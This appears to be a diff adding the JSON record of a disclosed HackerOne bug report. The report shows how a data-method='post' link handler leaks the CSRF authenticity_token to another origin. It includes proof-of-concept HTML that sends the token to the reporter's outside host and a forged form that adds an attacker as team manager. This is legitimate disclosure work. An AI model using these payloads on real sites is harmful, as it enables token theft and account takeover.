@@ -1,0 +1,110 @@
+{
+  "id": 47472,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzQ3Mg==",
+  "url": "https://hackerone.com/reports/47472",
+  "title": "CSP Bypass: Click handler for links with data-method=\"post\" can cause authenticity_token to be sent off domain",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-02-11T20:03:01.597Z",
+  "submitted_at": "2015-02-11T20:03:01.597Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "danlec",
+    "url": "/danlec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2015-02-26T21:50:46.056Z",
+  "bug_reporter_agreed_on_going_public_at": "2015-02-26T21:50:45.257Z",
+  "team_member_agreed_on_going_public_at": "2015-02-26T21:44:10.626Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Background**\r\n\r\n- There has been [at least one case](/reports/46072) where [an attacker](/danlec) was able to insert arbitrary HTML into a submitted report\r\n- HackerOne uses a very strict Content Security Policy that prevents inline script and script from other origins\r\n- HackerOne uses an `authenticity_token` in its POSTs to guard against CSRF attacks\r\n- There is a click handler for links with a`data-method` attribute that makes it so an `<a>` tag with a `data-method=\"post\"` will send the CSRF token in a POST to the `href` of the link, **even if the target is a different origin**\r\n\r\n**Proof of concept**\r\n\r\n1.  Suppose that someone is able to find an exploit similar to #46072, allowing them to insert arbitrary HTML into a report, and they insert the following payload:\r\n```\r\n<a href=\"http://danlec.com\" data-method=\"post\">Proof of Concept</a>\r\n```\r\n  Since I'm not currently aware of a means of doing this, we'll have to simulate this by running the following from the console:\r\n```\r\n$(\".hacktivity-container-content:first\")\r\n .html('<p><a href=\"http://danlec.com\" data-method=\"post\">Click Me!</a></p>')\r\n```\r\n  (Yes, in general security reports involving the victim running code on the console are highly suspect.  Please bear with me.)\r\n\r\n2.  When the victim clicks the link, the current `authenticity_token` is sent to <http://danlec.com>.  You can inspect the headers that are sent, or have the link be <http://httpbin.org/post> which will echo the headers that it was sent.\r\n\r\n3.  Using the `authenticity_token` it was provided, the target of the link could automatically submit a form like the following on the victim's behalf:\r\n```\r\n<form method=\"POST\" action=\"https://hackerone.com/danlec-test/team_members\"\r\n     target=\"_blank\">\r\n  <input type=\"text\" name=\"authenticity_token\" \r\n     value=\"authenticity_token from the POST to this page\">\r\n  <input type=\"text\" name=\"invitations_team_member[email]\" \r\n     value=\"attacker@gmail.com\">\r\n  <input type=\"hidden\" name=\"team_member[add_as_manager]\" value=\"1\">\r\n  <input type=\"hidden\" name=\"utf8\" value=\"✓\">\r\n  <input type=\"hidden\" name=\"commit\" value=\"Send invite\">\r\n  <input type=\"submit\">\r\n</form>\r\n```\r\n\r\nIt would make sense if the click handler for links with a `data-method` attribute only ran for links to URLs with the same origin, especially in situations warranting a strict Content Security Policy.\r\n\r\n",
+  "bounty_amount": "2000.0",
+  "formatted_bounty": "$2,000",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2015-03-28T21:44:16.580Z",
+  "allow_singular_disclosure_after": -280245134.52265954,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "sw33tlie",
+    "ali",
+    "r3y",
+    "japz",
+    "eidelweiss",
+    "shivammusic",
+    "dyabla",
+    "5_6"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
